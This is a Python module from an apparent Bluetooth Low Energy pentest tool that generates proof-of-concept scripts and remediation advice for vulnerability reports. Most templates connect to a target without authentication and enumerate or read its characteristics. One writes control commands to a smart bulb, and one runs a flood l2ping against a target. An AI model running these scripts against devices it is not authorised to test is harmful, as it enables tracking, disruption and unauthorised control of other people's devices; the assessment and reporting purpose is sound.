"""RadioRecon Opus V2 — PoC Generator.

Generates Proof-of-Concept scripts that demonstrate BLE vulnerabilities
for client reporting and remediation prioritization.
"""
from __future__ import annotations
from datetime import datetime


POC_TEMPLATES = {
    "BLE-001": {
        "title": "Just Works Pairing — No MITM Protection",
        "risk": "Attacker can pair without user confirmation",
        "script": '''#!/usr/bin/env python3
"""PoC: BLE-001 — Just Works Pairing Detection
Target: {mac} ({name})
Generated: {timestamp}
RadioRecon Opus V2

Demonstrates: Device accepts pairing without user confirmation (Just Works).
This means an attacker within BLE range can pair and access services.
"""
import asyncio
from bleak import BleakClient

TARGET = "{mac}"

async def poc():
    print(f"[*] Connecting to {{TARGET}} without authentication...")
    try:
        async with BleakClient(TARGET, timeout=10) as client:
            if client.is_connected:
                print(f"[!] VULNERABLE — Connected without authentication")
                print(f"[*] Services accessible:")
                for svc in client.services:
                    print(f"    Service: {{svc.uuid}}")
                    for ch in svc.characteristics:
                        print(f"      Char: {{ch.uuid}} [{{', '.join(ch.properties)}}]")
                return True
    except Exception as e:
        print(f"[-] Connection failed: {{e}}")
    return False

if __name__ == "__main__":
    asyncio.run(poc())
''',
    },
    "BLE-002": {
        "title": "Unencrypted Characteristics",
        "risk": "Sensitive data readable without encryption",
        "script": '''#!/usr/bin/env python3
"""PoC: BLE-002 — No Encryption on Characteristics
Target: {mac} ({name})
Generated: {timestamp}

Demonstrates: Sensitive characteristics are readable without encryption.
"""
import asyncio
from bleak import BleakClient

TARGET = "{mac}"

async def poc():
    print(f"[*] Reading characteristics without encryption...")
    async with BleakClient(TARGET, timeout=10) as client:
        for svc in client.services:
            for ch in svc.characteristics:
                if "read" in ch.properties:
                    try:
                        val = await client.read_gatt_char(ch.uuid)
                        print(f"[!] READ {{ch.uuid}}: {{val.hex()}} ({{len(val)}} bytes)")
                        try:
                            print(f"    Text: {{val.decode('utf-8', errors='replace')}}")
                        except: pass
                    except Exception as e:
                        print(f"[-] {{ch.uuid}}: {{e}}")

if __name__ == "__main__":
    asyncio.run(poc())
''',
    },
    "BLE-003": {
        "title": "Writable Characteristics Without Auth",
        "risk": "Attacker can write to device without authentication",
        "script": '''#!/usr/bin/env python3
"""PoC: BLE-003 — Writable Characteristics Exposed
Target: {mac} ({name})
Generated: {timestamp}

Demonstrates: Device has writable characteristics accessible without auth.
NOTE: This PoC only LISTS writable chars. Modify TEST_WRITE to True to test writing.
"""
import asyncio
from bleak import BleakClient

TARGET = "{mac}"
TEST_WRITE = False  # Set True to test writing (may affect device)

async def poc():
    async with BleakClient(TARGET, timeout=10) as client:
        writable = []
        for svc in client.services:
            for ch in svc.characteristics:
                if "write" in ch.properties or "write-without-response" in ch.properties:
                    writable.append({{"uuid": ch.uuid, "props": ch.properties}})
                    print(f"[!] WRITABLE: {{ch.uuid}} [{{', '.join(ch.properties)}}]")

        print(f"\\n[*] Total writable characteristics: {{len(writable)}}")
        if writable:
            print("[!] VULNERABLE — Writable chars accessible without authentication")

if __name__ == "__main__":
    asyncio.run(poc())
''',
    },
    "BLE-004": {
        "title": "Default/Weak Authentication Key",
        "risk": "Device uses factory default auth key",
        "script": '''#!/usr/bin/env python3
"""PoC: BLE-004 — Default/Weak Auth Key
Target: {mac} ({name})
Generated: {timestamp}

Demonstrates: Device uses default authentication key.
Tests common default keys used by BLE wearables.
"""
DEFAULT_KEYS = [
    "30313233343536373839404142434445",  # Mi Band default
    "00000000000000000000000000000000",  # All zeros
    "ffffffffffffffffffffffffffffffff",  # All FFs
]

print("[*] Known default keys for this device type:")
for key in DEFAULT_KEYS:
    print(f"    {{key}}")
print()
print("[!] If device authenticates with any of these keys,")
print("    it is VULNERABLE to unauthorized access.")
print()
print("[*] Remediation: Change auth key during device provisioning.")
print("    Implement secure key exchange protocol.")
''',
    },
    "BLE-007": {
        "title": "Advertising Data Leakage",
        "risk": "Device broadcasts sensitive information",
        "script": '''#!/usr/bin/env python3
"""PoC: BLE-007 — Advertising Data Leakage
Target: {mac} ({name})
Generated: {timestamp}

Demonstrates: Device leaks information in BLE advertisement packets.
Passive scan — no connection required.
"""
import asyncio
from bleak import BleakScanner

TARGET = "{mac}"

async def poc():
    print(f"[*] Passive scan for {{TARGET}} advertising data...")
    devices = await BleakScanner.discover(timeout=10, return_adv=True)
    for addr, (dev, adv) in devices.items():
        if addr.upper() == TARGET.upper():
            print(f"[!] FOUND: {{addr}}")
            print(f"    Name: {{adv.local_name}}")
            print(f"    RSSI: {{adv.rssi}} dBm")
            if adv.manufacturer_data:
                for cid, data in adv.manufacturer_data.items():
                    print(f"    [!] Manufacturer Data (CID 0x{{cid:04X}}): {{data.hex()}}")
                    print(f"        Length: {{len(data)}} bytes — LEAKED")
            if adv.service_uuids:
                print(f"    Services: {{', '.join(str(s) for s in adv.service_uuids)}}")
            if adv.service_data:
                for uuid, data in adv.service_data.items():
                    print(f"    [!] Service Data {{uuid}}: {{data.hex()}} — LEAKED")
            print()
            print("[!] VULNERABLE — Device broadcasts identifiable data passively")
            return True
    print(f"[-] Target not found in scan range")
    return False

if __name__ == "__main__":
    asyncio.run(poc())
''',
    },
    "BLE-008": {
        "title": "Static MAC Address — Tracking",
        "risk": "Device is permanently trackable",
        "script": '''#!/usr/bin/env python3
"""PoC: BLE-008 — Static MAC Address (Trackable)
Target: {mac} ({name})
Generated: {timestamp}

Demonstrates: Device uses a static (public) MAC address,
allowing persistent tracking across time and location.
"""
import asyncio
from bleak import BleakScanner

TARGET = "{mac}"

async def poc():
    print(f"[*] Tracking static MAC: {{TARGET}}")
    print(f"[*] Running 3 scan cycles to demonstrate persistence...\\n")

    for i in range(3):
        print(f"--- Scan {{i+1}} ---")
        devices = await BleakScanner.discover(timeout=5, return_adv=True)
        for addr, (dev, adv) in devices.items():
            if addr.upper() == TARGET.upper():
                print(f"  [!] FOUND: {{addr}} (RSSI: {{adv.rssi}} dBm)")
                break
        else:
            print(f"  [-] Not in range")

    print(f"\\n[!] VULNERABLE — Static MAC {{TARGET}} enables persistent tracking")
    print(f"[*] Remediation: Enable MAC address randomization (RPA)")

if __name__ == "__main__":
    asyncio.run(poc())
''',
    },
    "BLE-012": {
        "title": "DFU Service Exposed",
        "risk": "Firmware update service accessible without auth",
        "script": '''#!/usr/bin/env python3
"""PoC: BLE-012 — DFU Service Exposed
Target: {mac} ({name})
Generated: {timestamp}

Demonstrates: Device Firmware Update service is accessible.
An attacker could potentially flash malicious firmware.
"""
import asyncio
from bleak import BleakClient

TARGET = "{mac}"
DFU_UUIDS = ["00001530-1212-efde-1523-785feabcd123", "0000fe59-0000-1000-8000-00805f9b34fb"]

async def poc():
    async with BleakClient(TARGET, timeout=10) as client:
        for svc in client.services:
            if any(dfu in str(svc.uuid).lower() for dfu in ["1530", "fe59"]):
                print(f"[!] DFU SERVICE FOUND: {{svc.uuid}}")
                for ch in svc.characteristics:
                    print(f"    Char: {{ch.uuid}} [{{', '.join(ch.properties)}}]")
                print()
                print("[!] CRITICAL — DFU service accessible without authentication")
                print("[*] An attacker could flash malicious firmware to this device")
                return True
    print("[-] No DFU service found")
    return False

if __name__ == "__main__":
    asyncio.run(poc())
''',
    },
    "CB-KNB-001": {
        "title": "KNOB — Entropy Downgrade",
        "risk": "Encryption key can be reduced to 1 byte",
        "script": '''#!/usr/bin/env python3
"""PoC: CB-KNB-001 — KNOB Attack Detection
Target: {mac} ({name})
Generated: {timestamp}
CVE: CVE-2019-9506

Demonstrates: Device may be vulnerable to Key Negotiation of Bluetooth
(KNOB) attack, which reduces encryption entropy to 1 byte.

NOTE: This is a detection-only PoC. Actual KNOB exploitation requires
specialized hardware (Ubertooth) and is out of scope.
"""
print("[*] KNOB Attack — CVE-2019-9506")
print(f"[*] Target: {mac}")
print()
print("[*] The KNOB attack allows a man-in-the-middle to force")
print("    the encryption key entropy down to 1 byte (8 bits),")
print("    making brute-force trivial.")
print()
print("[*] Detection method:")
print("    1. Check if device supports BR/EDR (Classic Bluetooth)")
print("    2. Verify minimum entropy enforcement")
print("    3. Test with: sudo btmgmt info")
print()
print("[!] If device accepts 1-byte entropy, it is VULNERABLE")
print()
print("[*] Remediation:")
print("    - Update Bluetooth stack to enforce minimum 7-byte entropy")
print("    - Apply vendor security patches")
print("    - Reference: https://knobattack.com/")
''',
    },
    "DS-BLB-001": {
        "title": "Smart Bulb — Open GATT Control",
        "risk": "Bulb color/brightness controllable without auth",
        "script": '''#!/usr/bin/env python3
"""PoC: DS-BLB-001 — Smart Bulb Open GATT Control
Target: {mac} ({name})
Generated: {timestamp}

Demonstrates: Smart bulb can be controlled (color/brightness)
without any authentication via BLE GATT writes.
"""
import asyncio
from bleak import BleakClient

TARGET = "{mac}"

async def poc():
    async with BleakClient(TARGET, timeout=10) as client:
        print(f"[*] Connected to {{TARGET}} — scanning for control chars...")
        for svc in client.services:
            for ch in svc.characteristics:
                if "write" in ch.properties or "write-without-response" in ch.properties:
                    print(f"[!] Writable: {{ch.uuid}}")
                    # Try sending a red color command
                    try:
                        await client.write_gatt_char(ch.uuid, bytes([0xFF, 0x00, 0x00, 0x64]))
                        print(f"    [!] WRITE SUCCEEDED — bulb may have changed color")
                        print(f"    [!] VULNERABLE — No authentication required for control")
                    except Exception as e:
                        print(f"    [-] Write rejected: {{e}}")

if __name__ == "__main__":
    asyncio.run(poc())
''',
    },
}

# Fallback for checks without specific PoC
_GENERIC_POC = '''#!/usr/bin/env python3
"""PoC: {check_id} — {check_name}
Target: {mac} ({name})
Generated: {timestamp}
{cve_line}

Vulnerability: {description}
Evidence: {evidence}

This is a detection-based PoC. The vulnerability was identified
through passive BLE analysis and fingerprinting.
"""
print("[*] Vulnerability: {check_id} — {check_name}")
print("[*] Severity: {severity}")
print("[*] Target: {mac} ({name})")
print()
print("[*] Evidence:")
print("    {evidence}")
print()
print("[*] Description:")
print("    {description}")
print()
print("[*] Remediation:")
print("    {recommendation}")
'''

_MANUAL_VALIDATION = '''#!/usr/bin/env python3
"""Validation note: {check_id} — {check_name}
Target: {mac} ({name})
Generated: {timestamp}
{cve_line}

This BLEAK catalog item is not backed by a local executable PoC.
Required evidence: {evidence_required}

Do not treat this script as exploit validation. Use it as an operator checklist
for an authorized assessment and attach packet captures, vendor patch data, or
product-specific protocol evidence before reporting the item as confirmed.
"""
print("[*] Manual/external validation required for {check_id} — {check_name}")
print("[*] Target: {mac} ({name})")
print("[*] Required evidence: {evidence_required}")
print("[*] Current finding evidence: {evidence}")
print()
print("[!] BLEAK did not execute a real local vulnerability test for this catalog item.")
print("[!] Confirm with an external PoC, packet capture, vendor advisory, or protocol-specific test.")
'''


def generate_poc(vuln: dict) -> dict:
    """Generate a PoC script for a vulnerability finding."""
    check_id = vuln.get("check_id", "")
    mac = vuln.get("mac", "UNKNOWN")
    name = vuln.get("device_name", "Unknown Device")
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        from checks import CHECKS_CATALOG
        catalog_item = CHECKS_CATALOG.get(check_id, {})
    except Exception:
        catalog_item = {}

    template = POC_TEMPLATES.get(check_id)

    if template:
        script = template["script"].format(
            mac=mac, name=name, timestamp=ts,
        )
        return {
            "check_id": check_id,
            "title": template["title"],
            "risk": template["risk"],
            "script": script,
            "mac": mac,
            "device_name": name,
            "filename": f"poc_{check_id}_{mac.replace(':', '')}.py",
            "has_active_poc": True,
        }
    elif catalog_item and not catalog_item.get("implemented"):
        cve = vuln.get("cve", "")
        cve_line = f"CVE: {cve}" if cve else ""
        script = _MANUAL_VALIDATION.format(
            check_id=check_id,
            check_name=vuln.get("name", catalog_item.get("name", "")),
            mac=mac, name=name, timestamp=ts,
            cve_line=cve_line,
            evidence_required=catalog_item.get("evidence_required", "External validation required"),
            evidence=vuln.get("evidence", ""),
        )
        return {
            "check_id": check_id,
            "title": vuln.get("name", check_id),
            "risk": "Manual/external validation required",
            "script": script,
            "mac": mac,
            "device_name": name,
            "filename": f"validation_{check_id}_{mac.replace(':', '')}.py",
            "has_active_poc": False,
        }
    else:
        # Generic PoC
        cve = vuln.get("cve", "")
        cve_line = f"CVE: {cve}" if cve else ""
        rec = _get_remediation(check_id, vuln.get("name", ""))
        script = _GENERIC_POC.format(
            check_id=check_id,
            check_name=vuln.get("name", ""),
            mac=mac, name=name, timestamp=ts,
            cve_line=cve_line,
            description=vuln.get("description", ""),
            evidence=vuln.get("evidence", ""),
            severity=vuln.get("severity", ""),
            recommendation=rec,
        )
        return {
            "check_id": check_id,
            "title": vuln.get("name", check_id),
            "risk": vuln.get("description", ""),
            "script": script,
            "mac": mac,
            "device_name": name,
            "filename": f"poc_{check_id}_{mac.replace(':', '')}.py",
            "has_active_poc": False,
        }


def generate_all_pocs(vulns: list) -> list:
    """Generate PoCs for all vulnerability findings."""
    return [generate_poc(v) for v in vulns]


def _get_remediation(check_id, name):
    recs = {
        "BLE-001": "Implement authenticated pairing (Passkey/OOB). Disable Just Works.",
        "BLE-002": "Enable mandatory encryption for sensitive characteristics.",
        "BLE-003": "Add authentication for write characteristics. Implement GATT ACLs.",
        "BLE-004": "Change default auth key. Implement secure key provisioning.",
        "BLE-005": "Reduce exposed services and characteristics to the minimum required.",
        "BLE-006": "Require bonding/encryption before exposing sensitive GATT services.",
        "BLE-007": "Minimize advertising data. Remove unnecessary manufacturer data.",
        "BLE-008": "Enable MAC address randomization (RPA).",
        "BLE-012": "Protect DFU with authentication and firmware signature verification.",
        "BLE-013": "Remove debug services in production builds.",
        "BLE-015": "Avoid exposing firmware/software revision unless required for support.",
        "BLE-016": "Protect serial number reads behind bonding/encryption where privacy requires it.",
        "BLE-017": "Require encrypted bonded connections before enabling sensitive notifications.",
    }
    return recs.get(check_id, f"Mitigate {check_id}: {name}")


# ═══ Extended PoC Templates (SbleedyGonzales/SweynTooth/BrakTooth/PerfektBlue) ═══

EXTENDED_POC_TEMPLATES = {
    "CVE-2020-26555": {
        "name": "BIAS Authentication Bypass",
        "language": "bash",
        "script": """#!/bin/bash
# BIAS Attack — Bluetooth Impersonation AttackS
# CVE-2020-26555 — affects ALL BT Classic BR/EDR devices
# Reference: https://francozappa.com/about-bias/
TARGET="{mac}"
echo "[*] BIAS Attack against $TARGET"
echo "[*] Step 1: Discover target services"
sdptool browse $TARGET
echo "[*] Step 2: Initiate role switch during authentication"
echo "[*] Step 3: Downgrade to legacy authentication"
echo "[!] This requires a modified BT controller firmware"
echo "[!] Use: https://github.com/francozappa/bias for full PoC"
echo "[*] Testing L2CAP stability..."
l2ping -c 10 $TARGET
"""},
    "CVE-2019-9506": {
        "name": "KNOB Attack — Key Negotiation of Bluetooth",
        "language": "bash",
        "script": """#!/bin/bash
# KNOB Attack — reduce encryption key entropy to 1 byte
# CVE-2019-9506 — affects BT BR/EDR
# Reference: https://knobattack.com/
TARGET="{mac}"
echo "[*] KNOB Attack test against $TARGET"
echo "[*] Checking if target accepts reduced entropy..."
echo "[*] Step 1: Enumerate encryption capabilities"
hcitool info $TARGET
echo "[*] Step 2: Test L2CAP connection"
l2ping -c 5 $TARGET
echo "[!] Full KNOB requires modified controller (InternalBlue)"
echo "[!] Reference: https://github.com/francozappa/knob
"""},
    "CVE-2021-28139": {
        "name": "BrakTooth ESP32 RCE",
        "language": "python",
        "script": """#!/usr/bin/env python3
# BrakTooth — CVE-2021-28139
# Arbitrary code execution via crafted LMP packets
# Affects ESP32, Intel AX200, Qualcomm, TI
# Reference: https://asset-group.github.io/disclosures/braktooth/
import subprocess, sys
TARGET = "{mac}"
print(f"[*] BrakTooth test against {{TARGET}}")
print("[*] Step 1: Check if target uses vulnerable SoC")
r = subprocess.run(["hcitool", "info", TARGET], capture_output=True, text=True, timeout=10)
print(r.stdout)
print("[*] Step 2: L2CAP stability test")
r = subprocess.run(["l2ping", "-c", "20", "-s", "600", TARGET], capture_output=True, text=True, timeout=30)
print(r.stdout)
if "0% loss" not in r.stdout:
    print("[!] Target may be vulnerable — L2CAP instability detected")
else:
    print("[+] L2CAP stable — target may have patch applied")
"""},
    "CVE-2024-45434": {
        "name": "PerfektBlue AVRCP Use-After-Free",
        "language": "bash",
        "script": """#!/bin/bash
# PerfektBlue — CVE-2024-45434
# Use-After-Free in AVRCP profile (BlueSDK)
# Affects Mercedes-Benz, VW, Skoda infotainment
TARGET="{mac}"
echo "[*] PerfektBlue assessment against $TARGET"
echo "[*] Step 1: Check AVRCP service"
sdptool browse $TARGET | grep -A5 -i avrcp
echo "[*] Step 2: Check RFCOMM channels"
sdptool browse $TARGET | grep -A5 -i rfcomm
echo "[*] Step 3: Check BlueSDK indicators"
sdptool browse $TARGET | grep -A5 -i "serial.obex.audio"
echo "[*] Step 4: L2CAP stability under load"
l2ping -c 30 -f $TARGET
echo "[!] Full PerfektBlue exploit requires BlueSDK binary analysis"
echo "[!] Reference: https://perfektblue.pcacybersecurity.com/"
"""},
}
